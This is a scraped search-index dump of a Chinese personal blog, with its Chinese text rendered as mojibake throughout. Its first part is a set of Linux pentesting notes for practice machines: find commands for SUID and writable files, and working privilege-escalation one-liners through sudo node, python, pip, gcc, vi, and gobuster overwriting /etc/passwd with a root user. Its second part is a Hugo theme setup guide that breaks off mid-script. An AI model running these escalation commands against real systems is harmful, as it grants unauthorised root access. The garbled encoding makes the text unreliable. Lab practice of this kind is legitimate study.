ä»¥ä¸‹æ˜¯â€œæŸ¥æ‰¾â€å‘½ä»¤çš„ä¸€äº›æœ‰ç”¨ç¤ºä¾‹ã€‚ find . -name flag1.txt: åœ¨å½“å‰ç›®å½•ä¸­æŸ¥æ‰¾åä¸º â€œflag1.txtâ€ çš„æ–‡ä»¶ find /home -name flag1.txt: åœ¨ /home ç›®å½•ä¸­æŸ¥æ‰¾åä¸º â€œflag1.txtâ€ çš„æ–‡ä»¶ find / -type d -name config: åœ¨æ ¹ç›®å½• / ä¸‹æŸ¥æ‰¾åä¸º â€œconfigâ€ çš„ç›®å½• find / -type f -perm 0777: æŸ¥æ‰¾å…·æœ‰ 777 æƒé™ï¼ˆæ‰€æœ‰ç”¨æˆ·å‡å¯è¯»ã€å†™ã€æ‰§è¡Œï¼‰çš„æ–‡ä»¶ find / -perm a=x: æŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶ find /home -user frank: åœ¨ /home ç›®å½•ä¸‹æŸ¥æ‰¾å±äºç”¨æˆ· â€œfrankâ€ çš„æ‰€æœ‰æ–‡ä»¶ find / -mtime 10: æŸ¥æ‰¾è¿‡å» 10 å¤©å†…ä¿®æ”¹è¿‡çš„æ–‡ä»¶ find / -atime 10: æŸ¥æ‰¾è¿‡å» 10 å¤©å†…è®¿é—®è¿‡çš„æ–‡ä»¶ find / -cmin -60: æŸ¥æ‰¾åœ¨è¿‡å»ä¸€å°æ—¶ï¼ˆ60 åˆ†é’Ÿï¼‰å†…æ›´æ”¹è¿‡çš„æ–‡ä»¶ find / -amin -60: æŸ¥æ‰¾åœ¨è¿‡å»ä¸€å°æ—¶ï¼ˆ60 åˆ†é’Ÿï¼‰å†…è®¿é—®è¿‡çš„æ–‡ä»¶ find / -size 50M: æŸ¥æ‰¾å¤§å°ä¸º 50 MB çš„æ–‡ä»¶ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œâ€œfindâ€å‘½ä»¤å¾€å¾€ä¼šäº§ç”Ÿé”™è¯¯ï¼Œæœ‰æ—¶ä¼šå¯¼è‡´è¾“å‡ºéš¾ä»¥é˜…è¯»ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæ˜æ™ºçš„åšæ³•æ˜¯ä½¿ç”¨â€œfindâ€å‘½ä»¤å’Œâ€œ-type f 2\u003e/dev/nullâ€å°†é”™è¯¯é‡å®šå‘åˆ°â€œ/dev/nullâ€å¹¶è·å¾—æ›´æ¸…æ™°çš„è¾“å‡ºã€‚ find / -writable -type d 2\u003e/dev/null: æŸ¥æ‰¾å…¨å±€å¯å†™æ–‡ä»¶å¤¹ find / -perm -222 -type d 2\u003e/dev/null: æŸ¥æ‰¾å…¨å±€å¯å†™æ–‡ä»¶å¤¹ find / -perm -o w -type d 2\u003e/dev/null: æŸ¥æ‰¾å…¨å±€å¯å†™æ–‡ä»¶å¤¹ find / -perm -o x -type d 2\u003e/dev/null: æŸ¥æ‰¾å…¨å±€å¯æ‰§è¡Œæ–‡ä»¶å¤¹ æŸ¥æ‰¾å¼€å‘å·¥å…·å’Œæ”¯æŒçš„è¯­è¨€ï¼š find / -name perl* find / -name python* find / -name gcc* æŸ¥æ‰¾ç‰¹å®šæ–‡ä»¶æƒé™ï¼š find / -perm -u=s -type f 2\u003e/dev/null: æŸ¥æ‰¾å¸¦æœ‰SUIDä½çš„æ–‡ä»¶ï¼Œå®ƒå…è®¸æˆ‘ä»¬ä»¥æ¯”å½“å‰ç”¨æˆ·æ›´é«˜çš„æƒé™çº§åˆ«è¿è¡Œè¯¥æ–‡ä»¶ã€‚ ","date":"2025-03-01","objectID":"/linux%E7%AC%94%E8%AE%B0/:1:1","tags":["æ¸—é€"],"title":"Linuxç¬”è®°","uri":"/linux%E7%AC%94%E8%AE%B0/"},{"categories":["é¶åœº","æ‚è°ˆ"],"content":"è‡ªåŠ¨åŒ–å·¥å…· linPEAS LinEnum LES pspy hackç½‘ç«™ (ä½¿ç”¨æ–¹æ³•è‡ªå·±çœ‹ä¸€çœ¼å°±çŸ¥é“äº†) ","date":"2025-03-01","objectID":"/linux%E7%AC%94%E8%AE%B0/:1:2","tags":["æ¸—é€"],"title":"Linuxç¬”è®°","uri":"/linux%E7%AC%94%E8%AE%B0/"},{"categories":["é¶åœº","æ‚è°ˆ"],"content":"å¸¸è§ææƒæ–¹å¼(åªå†™ä¸€äº›ç»å¸¸é‡åˆ°çš„) å†…æ ¸æ¼æ´ kaliæœ‰é›†æˆå·¥å…·searchsploitï¼Œè¾“å…¥ç‰ˆæœ¬å·å»æ‰¾å°±è¡Œï¼Œç„¶åä¸Šä¼ åˆ°é¶æœºé‡Œé¢ sudoææƒ sudo node -e â€˜child_process.spawn(\"/bin/bash\",{stdio: [0,1,2]})â€™ gobusterææƒ perl -e 'print crypt(\"1\",\"aa\")' cat a.py from flask import Flask, Response app = Flask(__name__) @app.route('/', defaults={'path': ''}) @app.route('/\u003cpath:path\u003e') def catch_all(path): if len(path) == 36: return Response(status=404) else: return Response(status=200) if __name__ == '__main__': app.run(host=\"0.0.0.0\", port=80) python a.py * Serving Flask app 'a' * Debug mode: off WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Running on all addresses (0.0.0.0) * Running on http://127.0.0.1:80 * Running on http://192.168.64.3:80 Press CTRL+C to quit #é¶æœº echo 'aaa:aacFCuAIHhrCM:0:0:x:/root:/bin/bash' \u003e aaa sudo /usr/bin/gobuster -w aaa -u http://192.168.64.3 -n -q -o /etc/passwd cat /etc/passwd su - /aaa ç›´æ¥å†™å…¥ æœ‰äº›æ—¶å€™sudo -lä½ ä¼šå‘ç°å¯æ‰§è¡Œçš„æ˜¯ä¸ªå¯å†™å…¥æ–‡ä»¶ï¼Œé‚£ç›´æ¥å†™å…¥/bin/bashå»ææƒå³å¯ åˆå¦‚pythonå¯ä»¥ç›´æ¥æ‰§è¡Œæ—¶ sudo /usr/bin/python3 -c 'import os;os.execl(\"/bin/sh\",\"sh\",\"-p\")' pipææƒ TF=$(mktemp -d) echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh \u003c$(tty) \u003e$(tty) 2\u003e$(tty)')\" \u003e $TF/setup.py pip install $TF å†™å…¥å¯†ç  å½“/etc/passwdå¯ä»¥å†™å…¥çš„æ—¶å€™ï¼Œå¯ä»¥æŠŠrootçš„å¯†ç è®¾ç½®ä¸ºç©ºï¼Œæˆ–è€…æ˜¯openssl passwd -1å»ç”Ÿæˆå¯†ç ï¼ŒæŠŠrootçš„å¯†ç æ”¹äº† gccææƒ sudo gcc -wrapper /bin/sh,-s . vié€ƒé€¸ å‰æå°±æ˜¯å¯ä»¥rootæ‰§è¡Œviï¼Œç›´æ¥æ‰“å¼€viå†™å…¥:!shï¼Œæœ¬è´¨æ˜¯æ‰“å¼€äº†ä¸€ä¸ªshell ","date":"2025-03-01","objectID":"/linux%E7%AC%94%E8%AE%B0/:1:3","tags":["æ¸—é€"],"title":"Linuxç¬”è®°","uri":"/linux%E7%AC%94%E8%AE%B0/"},{"categories":["é¶åœº","æ‚è°ˆ"],"content":"å¸¸ç”¨æŒ¤å·§ æ–‡ä»¶ä¸Šä¼ orä¸‹è½½ ä¸ªäººå¸¸ç”¨sftp 1.SFTPå»ºç«‹è¿æ¥ sftp username@ip 2.ä¸Šä¼  ä¸Šå»ä¹‹åç›´æ¥put 3.ä¸‹è½½ ä¸Šå»ä¹‹åç›´æ¥getï¼Œæˆ–è€…æ˜¯mget * å¯ä»¥å¾—åˆ°å½“å‰ç›®å½•ä¸‹çš„å…¨éƒ¨æ–‡ä»¶ è¿˜æœ‰ä¸€ä¸ªæ–¹æ³•ï¼Œæœ¬åœ°åˆ©ç”¨pythonèµ·ä¸€ä¸ªæœåŠ¡ï¼Œé¶æœºåˆ©ç”¨wgetä¸‹è½½ python3 -m http.server 80 shell å½“ä½ åå¼¹shellå‡†å¤‡ææƒï¼Œå‘ç°shellä¸æ˜¯äº¤äº’å¼çš„ /usr/bin/script -qc /bin/bash /dev/null ç›´æ¥ä¸€æ­¥åˆ°ä½ é¶æœºç½‘å¡é…ç½® å¦‚æœæ‰«ä¸åˆ°å°±æŒ‰ç…§ä¸‹é¢æ“ä½œ åœ¨Linuxé•œåƒæˆåŠŸå®‰è£…åå¯åŠ¨ï¼Œè¿ç»­æŒ‰eè¿›å…¥ç¼–è¾‘æ¨¡å¼ï¼Œä¿®æ”¹roåŠå…¶åé¢ä¿¡æ¯ä¸ºrw single init=/bin/bashå…å¯†è¿›å…¥ç³»ç»Ÿã€‚ Ctrl+Xè¿›è¡Œä¿å­˜(Macä¸ºControl+X)è¿›å…¥ç³»ç»Ÿã€‚ è¿›å…¥ç³»ç»Ÿåï¼Œip addræŸ¥çœ‹å½“å‰ç½‘å¡ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œå­˜åœ¨ä¸¤ä¸ªç½‘å¡ï¼Œä¸€ä¸ªæ˜¯loå›ç¯ç½‘å¡ï¼Œå¦ä¸€ä¸ªåˆ™æ˜¯æˆ‘ä»¬å½“å‰è™šæ‹Ÿæœºè®¾å®šä½¿ç”¨çš„ç½‘å¡(æ¯”å¦‚enp0s1) å¦‚æœæ˜¯Ubuntu \u003c 20.04ç‰ˆæœ¬ï¼Œåˆ™é€šè¿‡vi /etc/network/interfacesä¿®æ”¹è¯¥é¶åœºçš„ç½‘å¡åenp0s3ä¸ºä¸Šé¢çš„enp0s1ã€‚å¦‚æœUbuntu \u003e= 20.04ï¼Œåˆ™vi nn fxxxx.yamlè¿›è¡Œä¿®æ”¹ã€‚å¦‚æœæ˜¯CentOSï¼Œåˆ™åœ¨/etc/sysconfig/network-scripts/ifcfg-xxxä¸­è¿›è¡Œç±»ä¼¼ä¿®æ”¹ æ³¨ï¼šå¸¸ç”¨äºvulnhubé¶åœº ","date":"2025-03-01","objectID":"/linux%E7%AC%94%E8%AE%B0/:1:4","tags":["æ¸—é€"],"title":"Linuxç¬”è®°","uri":"/linux%E7%AC%94%E8%AE%B0/"},{"categories":["é…ç½®"],"content":"hugoæ­å»º ","date":"2025-02-25","objectID":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/:1:0","tags":["hugo"],"title":"Hugoæ­å»ºä»¥åŠä¸»é¢˜å®Œå–„","uri":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/"},{"categories":["é…ç½®"],"content":"mac å®‰è£…hugo brew install hugo åˆ›å»ºåšå®¢ hugo new site myblog åˆ›å»ºä¸»é¢˜ cd site_name git init git submodule add https://github.com/dillonzq/LoveIt.git themes/LoveIt (git clone https://github.com/dillonzq/LoveIt.git themes/LoveIt ä¹Ÿå¯ä»¥) echo theme = â€œLoveItâ€ Â» hugo.toml å½“ç„¶ä½ ä¹Ÿå¯ä»¥é€‰æ‹©å…¶ä»–çš„ä¸»é¢˜ï¼Œæ–¹æ³•ä¸ä¹‹ç±»ä¼¼ ä¿®æ”¹é…ç½® ä½ çŸ¥é“çš„ï¼Œhugo.tomlé‡Œé¢å°±æ˜¯ä½ æ•´ä¸ªåšå®¢çš„é…ç½®ï¼ŒåŒ…æ‹¬åšå®¢åç§°ï¼Œä½œè€…åå­—ï¼Œå¤´åƒï¼Œè”ç³»æ–¹å¼ç­‰ï¼Œç›´æ¥ä¸Šæ¨¡æ¿ baseURL = \"https://your-domain.org\" # æ›´æ”¹ä½¿ç”¨ Hugo æ„å»ºç½‘ç«™æ—¶ä½¿ç”¨çš„é»˜è®¤ä¸»é¢˜ theme = \"LoveIt\" # ç½‘ç«™æ ‡é¢˜ title = \"Stilig\" defaultContentLanguage = \"zh-cn\" # ç½‘ç«™è¯­è¨€, ä»…åœ¨è¿™é‡Œ CN å¤§å†™ [\"en\", \"zh-CN\", \"fr\", \"pl\", ...] languageCode = \"zh-CN\" # è¯­è¨€åç§° [\"English\", \"ç®€ä½“ä¸­æ–‡\", \"FranÃ§ais\", \"Polski\", ...] languageName = \"ç®€ä½“ä¸­æ–‡\" # æ˜¯å¦åŒ…æ‹¬ä¸­æ—¥éŸ©æ–‡å­— hasCJKLanguage = true # é»˜è®¤æ¯é¡µåˆ—è¡¨æ˜¾ç¤ºçš„æ–‡ç« æ•°ç›® paginate = 12 # è°·æ­Œåˆ†æä»£å· [UA-XXXXXXXX-X] googleAnalytics = \"\" # ç‰ˆæƒæè¿°ï¼Œä»…ä»…ç”¨äº SEO copyright = \"\" # æ˜¯å¦ä½¿ç”¨ robots.txt enableRobotsTXT = true # æ˜¯å¦ä½¿ç”¨ git ä¿¡æ¯ #enableGitInfo = true # æ˜¯å¦ä½¿ç”¨ emoji ä»£ç  enableEmoji = true # å¿½ç•¥ä¸€äº›æ„å»ºé”™è¯¯ ignoreErrors = [\"error-remote-getjson\", \"error-missing-instagram-accesstoken\"] # ä½œè€…é…ç½® [author] name = \"Stilig\" email = \"your_email\" # èœå•é…ç½® [menu] [[menu.main]] weight = 1 identifier = \"posts\" # ä½ å¯ä»¥åœ¨åç§° (å…è®¸ HTML æ ¼å¼) ä¹‹å‰æ·»åŠ å…¶ä»–ä¿¡æ¯, ä¾‹å¦‚å›¾æ ‡ pre = \"\" # ä½ å¯ä»¥åœ¨åç§° (å…è®¸ HTML æ ¼å¼) ä¹‹åæ·»åŠ å…¶ä»–ä¿¡æ¯, ä¾‹å¦‚å›¾æ ‡ post = \"\" name = \"æ–‡ç« \" url = \"/posts/\" # å½“ä½ å°†é¼ æ ‡æ‚¬åœåœ¨æ­¤èœå•é“¾æ¥ä¸Šæ—¶, å°†æ˜¾ç¤ºçš„æ ‡é¢˜ title = \"\" [[menu.main]] weight = 2 identifier = \"tags\" pre = \"\" post = \"\" name = \"æ ‡ç­¾\" url = \"/tags/\" title = \"\" [[menu.main]] weight = 3 identifier = \"categories\" pre = \"\" post = \"\" name = \"åˆ†ç±»\" url = \"/categories/\" title = \"\" # Hugo è§£ææ–‡æ¡£çš„é…ç½® [markup] # è¯­æ³•é«˜äº®è®¾ç½® (https://gohugo.io/content-management/syntax-highlighting) [markup.highlight] # false æ˜¯å¿…è¦çš„è®¾ç½® (https://github.com/dillonzq/LoveIt/issues/158) codeFences = true guessSyntax = true lineNos = true lineNumbersInTable = true # false æ˜¯å¿…è¦çš„è®¾ç½® # (https://github.com/dillonzq/LoveIt/issues/158) # Goldmark æ˜¯ Hugo 0.60 ä»¥æ¥çš„é»˜è®¤ Markdown è§£æåº“ noClasses = false # Goldmark æ˜¯ Hugo 0.60 ä»¥æ¥çš„é»˜è®¤ Markdown è§£æåº“ [markup.goldmark] [markup.goldmark.extensions] definitionList = true footnote = true linkify = true strikethrough = true table = true taskList = true typographer = true [markup.goldmark.renderer] # æ˜¯å¦åœ¨æ–‡æ¡£ä¸­ç›´æ¥ä½¿ç”¨ HTML æ ‡ç­¾ unsafe = true # ç›®å½•è®¾ç½® [markup.tableOfContents] startLevel = 2 endLevel = 6 [params] # ç½‘ç«™é»˜è®¤ä¸»é¢˜æ ·å¼ [\"auto\", \"light\", \"dark\"] defaultTheme = \"light\" # å…¬å…± git ä»“åº“è·¯å¾„ï¼Œä»…åœ¨ enableGitInfo è®¾ä¸º true æ—¶æœ‰æ•ˆ #gitRepo = \"\" # LoveIt æ–°å¢ | 0.1.1 å“ªç§å“ˆå¸Œå‡½æ•°ç”¨æ¥ SRI, ä¸ºç©ºæ—¶è¡¨ç¤ºä¸ä½¿ç”¨ SRI # [\"sha256\", \"sha384\", \"sha512\", \"md5\"] fingerprint = \"sha256\" # LoveIt æ–°å¢ | 0.2.0 æ—¥æœŸæ ¼å¼ dateFormat = \"2006-01-02\" # ç½‘ç«™æ ‡é¢˜, ç”¨äº Open Graph å’Œ Twitter Cards title = \"Stiligçš„åšå®¢\" # ç½‘ç«™æè¿°, ç”¨äº RSS, SEO, Open Graph å’Œ Twitter Cards description = \"Stiligçš„åšå®¢\" # ç½‘ç«™å›¾ç‰‡, ç”¨äº Open Graph å’Œ Twitter Cards images = [\"é¦–é¡µä¸­é—´çš„å›¾ç‰‡\"] # é¡µé¢å¤´éƒ¨å¯¼èˆªæ é…ç½® [params.header] # æ¡Œé¢ç«¯å¯¼èˆªæ æ¨¡å¼ [\"fixed\", \"normal\", \"auto\"] desktopMode = \"normal\" # ç§»åŠ¨ç«¯å¯¼èˆªæ æ¨¡å¼ [\"fixed\", \"normal\", \"auto\"] mobileMode = \"normal\" # LoveIt æ–°å¢ | 0.2.0 é¡µé¢å¤´éƒ¨å¯¼èˆªæ æ ‡é¢˜é…ç½® [params.header.title] # LOGO çš„ URL logo = \"\" # æ ‡é¢˜åç§° name = \"Stilig\" # ä½ å¯ä»¥åœ¨åç§° (å…è®¸ HTML æ ¼å¼) ä¹‹å‰æ·»åŠ å…¶ä»–ä¿¡æ¯, ä¾‹å¦‚å›¾æ ‡ pre = \"\" # ä½ å¯ä»¥åœ¨åç§° (å…è®¸ HTML æ ¼å¼) ä¹‹åæ·»åŠ å…¶ä»–ä¿¡æ¯, ä¾‹å¦‚å›¾æ ‡ post = \"\" # LoveIt æ–°å¢ | 0.2.5 æ˜¯å¦ä¸ºæ ‡é¢˜æ˜¾ç¤ºæ‰“å­—æœºåŠ¨ç”» typeit = false # é¡µé¢åº•éƒ¨ä¿¡æ¯é…ç½® [params.footer] enable = true # LoveIt æ–°å¢ | 0.2.0 è‡ªå®šä¹‰å†…å®¹ (æ”¯æŒ HTML æ ¼å¼) custom = '' # LoveIt æ–°å¢ | 0.2.0 æ˜¯å¦æ˜¾ç¤º Hugo å’Œä¸»é¢˜ä¿¡æ¯ hugo = false # LoveIt æ–°å¢ | 0.2.0 æ˜¯å¦æ˜¾ç¤ºç‰ˆæƒä¿¡æ¯ copyright = true # LoveIt æ–°å¢ | 0.2.0 æ˜¯å¦æ˜¾ç¤ºä½œè€… author = true # ç½‘ç«™åˆ›ç«‹å¹´ä»½ since = 2022 # ICP å¤‡æ¡ˆä¿¡æ¯ï¼Œä»…åœ¨ä¸­å›½ä½¿ç”¨ (æ”¯æŒ HTML æ ¼å¼) icp = '' # è®¸å¯åè®®ä¿¡æ¯ (æ”¯æŒ HTML æ ¼å¼) license = '\u003ca rel=\"license external nofollow noopener noreffer\" href=\"https://creativecommons.org/licenses/by-nc/4.0/\" target=\"_blank\"\u003eCC BY-NC 4.0\u003c/a\u003e' # LoveIt æ–°å¢ | 0.2.0 Section (æ‰€æœ‰æ–‡ç« ) é¡µé¢é…ç½® [params.section] # section é¡µé¢æ¯é¡µæ˜¾ç¤ºæ–‡ç« æ•°é‡ paginate = 20 # æ—¥æœŸæ ¼å¼ (æœˆå’Œæ—¥) dateFormat = \"01-02\" # RSS æ–‡ç« æ•°ç›® rss = 10 # LoveIt æ–°å¢ | 0.2.0 List (ç›®å½•æˆ–æ ‡ç­¾) é¡µé¢é…ç½® [params.list] # list é¡µé¢æ¯é¡µæ˜¾ç¤ºæ–‡ç« æ•°é‡ paginate = 20 # æ—¥æœŸæ ¼å¼ (æœˆå’Œæ—¥) dateFormat = \"01-02\" # RSS æ–‡ç« æ•°ç›® rss = 10 # LoveIt æ–°å¢ | 0.2.0 åº”ç”¨å›¾æ ‡é…ç½® [params.app] # å½“æ·»åŠ åˆ° iOS ä¸»å±å¹•æˆ–è€… Android å¯åŠ¨å™¨æ—¶çš„æ ‡é¢˜, è¦†ç›–é»˜è®¤æ ‡é¢˜ title = \"\" # æ˜¯å¦éšè—ç½‘ç«™å›¾æ ‡èµ„æºé“¾æ¥ noFavicon = false # æ›´ç°ä»£çš„ SVG ç½‘ç«™å›¾æ ‡, å¯æ›¿ä»£æ—§çš„ .png å’Œ .ico æ–‡ä»¶ svgFavicon = \"\" # Android æµè§ˆå™¨ä¸»é¢˜è‰² themeColor = \"#ffffff\" ","date":"2025-02-25","objectID":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/:1:1","tags":["hugo"],"title":"Hugoæ­å»ºä»¥åŠä¸»é¢˜å®Œå–„","uri":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/"},{"categories":["é…ç½®"],"content":"windows\u0026linux å¦‚æœä½ æ˜¯è¿™ä¸¤ä¸ªç³»ç»Ÿï¼Œç›´æ¥å»å®˜ç½‘https://gohugo.io/installation/ ï¼Œå½“ç„¶Linuxåº”è¯¥æ˜¯å¯ä»¥ç›´æ¥aptçš„,å…¶ä»–çš„å’Œmacä¸€æ · ","date":"2025-02-25","objectID":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/:1:2","tags":["hugo"],"title":"Hugoæ­å»ºä»¥åŠä¸»é¢˜å®Œå–„","uri":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/"},{"categories":["é…ç½®"],"content":"hugoå®Œå–„ ","date":"2025-02-25","objectID":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/:2:0","tags":["hugo"],"title":"Hugoæ­å»ºä»¥åŠä¸»é¢˜å®Œå–„","uri":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/"},{"categories":["é…ç½®"],"content":"å‰æ æŠŠè‡ªå·±çš„hugo.tomlé‡Œé¢çš„ä¸ªäººä¿¡æ¯å’Œç½‘ç«™ä¿¡æ¯é…ç½®å¥½äº†ï¼Œè¦ä¸ç„¶ä¼šå¾ˆä¹±ã€‚ ","date":"2025-02-25","objectID":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/:2:1","tags":["hugo"],"title":"Hugoæ­å»ºä»¥åŠä¸»é¢˜å®Œå–„","uri":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/"},{"categories":["é…ç½®"],"content":"æ–‡ç« æ¨¡æ¿ åœ¨ä½ çš„mysite/archetypes/default.mdæ–‡ä»¶é‡Œæ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š --- title: \"{{ replace .TranslationBaseName \"-\" \" \" | title }}\" subtitle: \"\" date: {{ .Date }} lastmod: {{ .Date }} draft: true author: \"\" authorLink: \"\" license: \"\" tags: [\"\"] categories: [\"\"] featuredImage: \"\" featuredImagePreview: \"\" summary: \"\" hiddenFromHomePage: false hiddenFromSearch: false toc: enable: true auto: true mapbox: share: enable: true comment: enable: true --- è¿™æ˜¯æˆ‘ä¸ªäººæ¯”è¾ƒå–œæ¬¢çš„æ¨¡æ¿ï¼Œä½ å¯ä»¥æ ¹æ®è‡ªå·±çš„å–œå¥½ä¿®æ”¹ã€‚ ","date":"2025-02-25","objectID":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/:2:2","tags":["hugo"],"title":"Hugoæ­å»ºä»¥åŠä¸»é¢˜å®Œå–„","uri":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/"},{"categories":["é…ç½®"],"content":"æ·»åŠ ç»Ÿè®¡åŠŸèƒ½ åœ¨your_site\\layouts\\partials\\plugin\\ä¸‹åˆ›å»ºbusuanzi.htmlæ–‡ä»¶ï¼Œå†™å…¥ {{ if .params.enable }} {{ if eq .bsz_type \"footer\" }} {{/* åªæœ‰ footer æ‰åˆ·æ–°ï¼Œé˜²æ­¢é¡µé¢è¿›è¡Œå¤šæ¬¡è°ƒç”¨ï¼Œè®¡æ•°é‡å¤; åªè¦å¯ç”¨å°±è®¡æ•°ï¼Œæ˜¾ç¤ºä¸å¦çœ‹å…·ä½“è®¾ç½® */}} \u003cscript async src=\" //busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js \"\u003e\u003c/script\u003e {{ end }} {{ if or (eq .params.site_pv true) (eq .params.site_uv true) (eq .params.page_pv true) }} {{ if eq .bsz_type \"footer\" }} \u003csection\u003e {{ if eq .params.site_pv true }} \u003cspan id=\"busuanzi_container_value_site_pv\"\u003e {{- with .params.page_pv_pre -}} {{ . | safeHTML }} {{ end }} \u003cspan id=\"busuanzi_value_site_pv\"\u003e\u003c/span\u003e \u003c/span\u003e {{ end }} {{ if and (eq .params.site_pv true) (eq .params.site_uv true) }} \u0026nbsp;|\u0026nbsp; {{ end }} {{ if eq .params.site_uv true }} \u003cspan id=\"busuanzi_container_value_site_uv\"\u003e {{- with .params.site_uv_pre -}} {{ . | safeHTML }} {{ end }} \u003cspan id=\"busuanzi_value_site_uv\"\u003e\u003c/span\u003e \u003c/span\u003e {{ end }} \u003c/section\u003e {{ end }} {{/* page pv åªåœ¨ page æ˜¾ç¤º */}} {{ if and (eq .params.page_pv true) (eq .bsz_type \"page-reading\") }} \u003cspan id=\"busuanzi_container_value_page_pv\"\u003e {{- with .params.page_pv_pre -}} {{ . | safeHTML }} {{ end }} \u003cspan id=\"busuanzi_value_page_pv\"\u003e\u003c/span\u003e\u0026nbsp; {{- T \"views\" -}} \u003c/span\u003e {{ end }} {{ end }} {{ end }} ç„¶ååœ¨hugo.tomlé‡Œæ·»åŠ  # æ·»åŠ ä¸è’œå­è®¡æ•° [params.busuanzi] enable = true # æ˜¯å¦å¼€å¯å…¨ç«™ç‹¬ç«‹è®¿å®¢æ•° site_uv = true # å…¨ç«™ç‹¬ç«‹è®¿å®¢æ•°å‰çš„å›¾æ ‡æˆ–æç¤ºè¯­ site_uv_pre = '\u003ci class=\"fa fa-user\"\u003e\u003c/i\u003e' # å…¨ç«™ç‹¬ç«‹è®¿å®¢æ•°åçš„å›¾æ ‡æˆ–æç¤ºè¯­ site_uv_post = '' # æ˜¯å¦å¼€å¯å…¨ç«™æµè§ˆé‡ site_pv = true # å…¨ç«™æµè§ˆé‡å‰çš„å›¾æ ‡æˆ–æç¤ºè¯­ site_pv_pre = '\u003ci class=\"fa fa-eye\"\u003e\u003c/i\u003e' # å…¨ç«™æµè§ˆé‡åçš„å›¾æ ‡æˆ–æç¤ºè¯­ site_pv_post = '' # æ˜¯å¦å¼€å¯å•é¡µæµè§ˆé‡ page_pv = true # å•é¡µæµè§ˆé‡å‰çš„å›¾æ ‡æˆ–æç¤ºè¯­ page_pv_pre = '\u003ci class=\"far fa-eye fa-fw\"\u003e\u003c/i\u003e' # å•é¡µæµè§ˆé‡åçš„å›¾æ ‡æˆ–æç¤ºè¯­ page_pv_post = '' é¡µè„šç»Ÿè®¡ æŠŠyour_site\\themes\\LoveIt\\layouts\\partials\\footer.htmlå¤åˆ¶ç²˜è´´åˆ°è·¯å¾„your_site\\layouts\\partials\\ä¸‹ã€‚ å†ä¿®æ”¹æ–‡ä»¶your_site\\layouts\\partials\\footer.htmlï¼Œåœ¨æœ€åä¸‰è¡Œ \u003c/div\u003e \u003c/footer\u003e {{- end -}} å‰é¢æ·»åŠ  {{- /* busuanzi plugin */ -}} {{- partial \"plugin/busuanzi.html\" (dict \"params\" .Site.Params.busuanzi \"bsz_type\" \"footer\") -}} ç„¶åä½ å°±æ— æ•Œäº† æ–‡ç« ç»Ÿè®¡ æŠŠyour_site\\themes\\LoveIt\\layouts\\posts\\single.htmlå¤åˆ¶ç²˜è´´åˆ°è·¯å¾„your_site\\layouts\\posts\\ä¸‹ã€‚å†åœ¨your_site\\layouts\\posts\\single.htmlä¸­æ‰¾åˆ°ç¬¬äºŒä¸ªæ ‡ç­¾ï¼Œå¹¶åœ¨è¯¥æ ‡ç­¾ä¸‹æ·»åŠ ä¸‹é¢çš„ä»£ç  {{- /* busuanzi plugin */ -}} {{- partial \"plugin/busuanzi.html\" (dict \"params\" .Site.Params.busuanzi \"bsz_type\" \"page-reading\") -}} ","date":"2025-02-25","objectID":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/:2:3","tags":["hugo"],"title":"Hugoæ­å»ºä»¥åŠä¸»é¢˜å®Œå–„","uri":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/"},{"categories":["é…ç½®"],"content":"æ–‡ç« åŠ å¯† å¦‚æœæ–‡ç« ä¸æƒ³ç»™åˆ«äººçœ‹ï¼Œä½†æ˜¯è‡ªå·±åˆå†™å®Œäº†ï¼Œå“ï¼Œè¿™å°±å¾ˆçƒ¦ï¼Œæ€ä¹ˆåŠå‘¢ï¼Œå•ç‹¬é¡µé¢åŠ å¯†å°±å¥½äº† å°†your_site\\themes\\LoveIt\\layouts\\posts\\single.htmlå¤åˆ¶ç²˜è´´åˆ°your_site\\layouts\\posts\\è·¯å¾„ä¸‹ã€‚æ‰“å¼€your_site\\layouts\\posts\\single.htmlæ–‡ä»¶ï¼Œåœ¨{{- $params := .Scratch.Get â€œparamsâ€ -}}ä¸‹æ·»åŠ ä¸‹é¢å†…å®¹ï¼š {{- $password := $params.password | default \"\" -}} {{- if ne $password \"\" -}} \u003cscript\u003e (function(){ if({{ $password }}){ if (prompt('è¯·è¾“å…¥æ–‡ç« å¯†ç ') != {{ $password 